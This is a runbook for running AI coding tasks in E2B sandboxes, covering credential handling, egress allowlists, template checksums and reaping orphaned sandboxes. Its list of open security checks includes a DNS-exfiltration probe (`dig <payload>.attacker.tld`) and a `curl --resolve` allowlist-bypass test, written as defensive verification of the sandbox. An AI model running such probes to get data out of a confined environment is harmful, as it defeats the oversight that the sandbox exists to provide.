# E2B Runs / RUNBOOK

## Before editing

```bash
ravi specs get sandbox/e2b-runs --mode full --json
```

Read `src/sandbox/e2b.ts` top to bottom once: the run is one long function
with the network, credential and signal handling interleaved on purpose, so a
change in one place usually needs a test in `src/sandbox/e2b.test.ts` that
drives the fake sandbox end to end.

## Running a task

```bash
export E2B_API_KEY=…  ANTHROPIC_API_KEY=sk-ant-api03-…   # never an OAuth token
ravi sandbox run --repo https://github.com/owner/repo.git --task "…" --follow
```

- Private GitHub repo: also export `GITHUB_TOKEN`. It is used during the clone
  only.
- The worker needs a host that is not a package registry:
  `--allow-host internal.example.com --allow-host '*.corp.example'`.
- No registries at all: `--egress strict`.
- A broker in front of Anthropic: `RAVI_SANDBOX_ANTHROPIC_BASE_URL=https://…`
  (model auth becomes `broker`).
- Private repo on a host where the GitHub transform rule is not honoured:
  `--github-auth file` (the token goes through git's credential file inside the
  sandbox, removed after the clone; the model key still travels by header).
- A host where header injection cannot work for the model either:
  `--model-auth env --allow-key-in-env` (the key is then visible to E2B;
  `--keep` is refused).
- Go repositories: the preset has no GOPROXY (it relays to arbitrary origins);
  add `--allow-host proxy.golang.org --allow-host sum.golang.org` knowingly.
- Title plus instructions are capped at 100 KiB; put longer material in the
  repository and refer to it.

## Building the template

```bash
ravi sandbox template build                      # dev, resolved to a SHA on this host
ravi sandbox template build --ref v1.2.3         # a tag
ravi sandbox template build --ref <40-hex sha>   # a commit; needs no resolution
```

- The host needs `git` and network access to github.com for `git ls-remote`.
  "Cannot resolve --ref" means no branch or tag of that name exists on
  `https://github.com/filipexyz/ravi.git`; an unpushed local commit cannot be
  baked in, since the sandbox fetches it from GitHub.
- The build fails at the checkout step when GitHub does not serve the commit
  (a SHA that was force-pushed away) or at a `sha256sum` line when a download
  does not match its pinned digest. A digest mismatch is a stop, not a retry:
  check the publisher's checksum file before changing anything.
- A 40-hex `--ref` is taken as the commit without resolution or any check that
  it is on a branch: GitHub serves any commit in the repository network (forks
  included), so the operator passing it is trusting that commit. Prefer a
  branch or tag unless the exact commit is the point.
- The result and `~/.ravi/sandbox-templates.json` (0600) hold the commit. The
  record is what this host built last, not what a sandbox booted from, so
  `sandbox run` asks E2B for the sandbox's template id and prints
  `Template <name>: ravi <sha> (built <ts> on this host)` only when that id is
  the recorded one. Otherwise it prints
  `Template <name>: id <id> does not match this host's record (<recorded id>, ravi <sha>) — rebuilt elsewhere?`
  (the template of that name was rebuilt from another host or the dashboard)
  and the JSON `templateSha` is null; rebuild from this host to pin it again.
  With no record at all it warns before creating the sandbox.

### Checksum provenance

Each constant in `src/sandbox/e2b.ts` is copied from the publisher's checksum
file, which was downloaded into a scratch directory and read as data (nothing
from it was executed). To bump a version, fetch the new file the same way,
copy the one line, and update this table.

| Constant | Archive | Source file | Fetched |
|---|---|---|---|
| `TEMPLATE_BUN_LINUX_X64_SHA256` = `8611ba935af886f05a6f38740a15160326c15e5d5d07adef966130b4493607ed` | `bun-linux-x64.zip` (bun v1.3.11) | <https://github.com/oven-sh/bun/releases/download/bun-v1.3.11/SHASUMS256.txt> | 2026-10-13 |
| `NATS_LINUX_AMD64_SHA256` = `397a6deffb5533e160de0cca322bc3dcaec7fb7282d66a3dfa87a9c183152ad1` | `nats-server-v2.11.8-linux-amd64.tar.gz` | <https://github.com/nats-io/nats-server/releases/download/v2.11.8/SHA256SUMS> | 2026-10-13 |

Bun 1.3.11 is the CI version (`.github/workflows/ci.yml`); keep the two in step.

## Reaping orphaned sandboxes

```bash
ravi sandbox reap                     # plan only: exit 3 when there is something to kill
ravi sandbox reap --execute           # kill paused, overdue and dead-pid sandboxes of this host
ravi sandbox reap --older-than 30 --execute
ravi sandbox reap --all-hosts         # plan across every host's ravi-task sandboxes (paused or overdue only)
```

- Run it after a host crash, a forgotten `--keep`, or when the E2B dashboard
  shows ravi-task sandboxes with no run behind them. The plan lists each
  candidate with its cause (`paused`, `overdue`, `dead-pid`) and age.
- Every paused sandbox of this host is a candidate, including one you paused
  with `--keep` on purpose and still want to inspect: the reaper cannot tell a
  forgotten pause from a deliberate one. Read the plan (the default dry-run,
  exit 3) before adding `--execute`, and inspect or snapshot the kept sandbox
  first.
- A sandbox a live `sandbox run` owns is skipped as `live` as long as its
  `ravi_pid` is alive and it is younger than `--older-than`; do not lower
  `--older-than` below the longest `--timeout-min` in use plus five minutes.
- `--all-hosts` is for one operator cleaning several machines; it still never
  touches sandboxes without `purpose: ravi-task`, and never judges another
  host's pid. A paused sandbox someone else kept on purpose is a candidate
  under `--all-hosts`: look at the plan first.
- A kill that fails is reported in `failed` and the exit code is 1; re-run, or
  kill it in the E2B dashboard.

## Debugging a failed run

`~/.ravi/sandbox-runs/<sandbox-id>/run.log` has the step timeline, including
the line `Egress: deny-all except …` that lists the run-phase allowlist.
`daemon.log`, `sessions/*.trace.txt` and `transcripts/` show what the worker
did. `e2b/processes.txt` lists every command E2B ran; the task text must not
appear in it (only `$(cat /home/user/.ravi-task/…)`).

- `git clone` fails with a TLS or 403 error on a private repo: the GitHub
  transform rule is not being honoured (CA trust, see the open checks below) or
  the token is wrong. The runner falls back to git's credential file on its own
  only when the secret store refuses the rule, not when the proxy does not
  inject. To force the file path while the proxy problem is investigated, run
  with `--github-auth file`; the model key keeps going through the header.
- A second Ctrl-C during the kill is ignored on purpose (`cleanup in progress`
  in run.log); the process exits once the kill and the secret removal settle,
  or after 15 s at most.
- `e2b/processes.txt` shows `ANTHROPIC_API_KEY=sk-ant-api03-ravi-sandbox-placeholder`
  in clear: that is the placeholder, not a key, and the redaction leaves it so.
- Claude Code reports 401 from the model: in `header` mode the `x-api-key`
  rule did not fire. Check the sandbox's network config in the E2B dashboard:
  the rule for `api.anthropic.com` must show the `${e2b.secrets.…}`
  placeholder, never a literal key.
- `bun install` or tests fail with network errors: the host is not in the
  allowlist. Add it with `--allow-host`; do not switch off `denyOut`.
- A paused (`--keep`) sandbox cannot be used for anything that needs the
  network; that is by design. Resume it in the E2B dashboard and inspect the
  filesystem only.

## Leaked secret

If an E2B secret named `ravi-sbx-<runId>-…` survives a crashed run, remove it:

```bash
# in a bun REPL with the e2b package
await Secret.destroy("ravi-sbx-<runId>-anthropic", { apiKey: process.env.E2B_API_KEY })
```

Then rotate the Anthropic key or GitHub token it held.

## Open live checks (need the E2B test key; none can run from the fake)

Each is a security question the fake cannot answer. Record the result here with
its date when it has run; until then treat the answer as unknown, not as safe.

1. DNS exfiltration under deny-all. Inside a sandbox created with
   `denyOut: ["0.0.0.0/0"]` and the clone-phase `allowOut`, does
   `dig <payload>.attacker.tld @8.8.8.8` (UDP/53 to an external resolver) fail,
   and does DNS-over-HTTPS to a resolver that is not in `allowOut` fail? If
   either succeeds, the policy leaks data through names and the preset is not
   the bound it claims to be. Also note whether ordinary resolution of
   allowlisted hosts still works (it has to, or nothing does).
   Result: not yet run.
2. SNI versus resolved IP. Does `allowOut: ["registry.npmjs.org"]` match on the
   TLS SNI / HTTP host, or on the address the name resolved to? If on the
   address, every other service behind the same CDN edge is reachable too
   (`curl --resolve other.cdn.host:443:<ip> https://other.cdn.host/` from the
   sandbox tells). Result: not yet run.
3. Does E2B log `files.write` content? Write a marker string with
   `sandbox.files.write` and look for it in `ravi sandbox logs <id>`
   (`e2b/processes.txt`, `e2b/logs.txt`). The credential-file clone path
   (`--github-auth file`) and the task-text files rely on the answer being no.
   Result: not yet run.
4. CA trust under transform rules. Do `git clone` and Claude Code (Node) accept
   E2B's egress-proxy certificate when a rule rewrites headers on
   `github.com` and `api.anthropic.com`? If not, set `NODE_EXTRA_CA_CERTS`
   (and git's `http.sslCAInfo`) to E2B's CA path in the sandbox env, or the
   header modes cannot work. Result: not yet run.
5. Also confirm that `Sandbox.list({ query: { metadata } })` filters on
   `ravi_run`/`ravi_host` (the reaper re-filters client-side either way, so a
   looser match costs a longer listing, not a wrong kill), and that
   `updateNetwork` preserves `allowPublicTraffic: false`. Result: not yet run.
6. Template build end to end: `ravi sandbox template build --ref dev` passes
   both `sha256sum -c` lines and the `rev-parse` test, the E2B dashboard shows
   the 12-hex tag, and a second build of the same ref reuses the cached layers
   while a build of a newer commit does not. Result: not yet run.

`header` model auth is the default, but it is not trusted until check 4 is
recorded here with its date: so far it has only been exercised against the
fake. The known-good path for a real run today is `--model-auth env
--allow-key-in-env` for the model and `--github-auth file` for a private clone,
both with the costs stated above.
